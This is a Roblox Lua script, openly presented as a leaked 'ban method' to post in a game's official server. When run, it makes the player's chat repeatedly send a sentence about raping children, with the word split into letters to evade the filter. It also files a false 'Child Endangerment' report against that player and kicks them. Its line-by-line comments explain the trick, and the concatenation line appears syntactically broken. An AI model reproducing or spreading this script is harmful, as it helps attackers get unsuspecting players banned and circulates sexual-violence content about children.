--[[
  _                _            _    _____                                       _       ____                __  __      _   _               _ 
 | |              | |          | |  / ____|                                     | |     |  _ \              |  \/  |    | | | |             | |
 | |     ___  __ _| | _____  __| | | |     _ __ ___  ___ ___ _ __ ___   __ _  __| |___  | |_) | __ _ _ __   | \  / | ___| |_| |__   ___   __| |
 | |    / _ \/ _` | |/ / _ \/ _` | | |    | '__/ _ \/ __/ __| '__/ _ \ / _` |/ _` / __| |  _ < / _` | '_ \  | |\/| |/ _ \ __| '_ \ / _ \ / _` |
 | |___|  __/ (_| |   <  __/ (_| | | |____| | | (_) \__ \__ \ | | (_) | (_| | (_| \__ \ | |_) | (_| | | | | | |  | |  __/ |_| | | | (_) | (_| |
 |______\___|\__,_|_|\_\___|\__,_|  \_____|_|  \___/|___/___/_|  \___/ \__,_|\__,_|___/ |____/ \__,_|_| |_| |_|  |_|\___|\__|_| |_|\___/ \__,_|
                                                                                                                                               
I've changed name to "Cr---roads" so you can actually send it in their official server, have fun!

You agree by using this script that i do not take responsibility for what you do with this. This paste is released for educational purposes so you can investigate the code
You may also consider reporting the bug to Roblox VIA: https://www.roblox.com/support ( IF THEY GET A TON OF REQUESTS THEY WILL DO SOMETHING ABT IT ! )
]]--   

repeat wait() until game:IsLoaded() -- The game's server wait until you are fully loaded so your character can access chat ( to the exploit can start )

local Players = game:GetService'Players' -- The game request the players in the game
local SayMessageRequest = 
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest -- Game's request Players chat by going into files of the game
local a = 'p'
local g = 'r'
local d = 'a'
local f = 'e'

spawn(function()
    while true do
        SayMessageRequest:FireServer('I '..g..d..a..f' children.') -- Tricks the game by putting ' a=p ' and all so it forms the word "rape"
        task.wait(0.8) -- Wait's 0.8 seconds to send the report
        Players:ReportAbuse(Players.LocalPlayer, 'Child Endangerment', 'Child Endangerment') -- The game reports all the players for Child Engangerment 
    end
end)

wait(8)

Players.LocalPlayer:Kick() -- Kicks players after 8 seconds ( End of the loading screen of the game )

-- CODE LEAKED BY 'k[39kb~¹1M×Drµ¿V|½)5M\ö*Ñ÷¿#3468', REWROTEN & EXPLAIN BY 'bbb#4444'

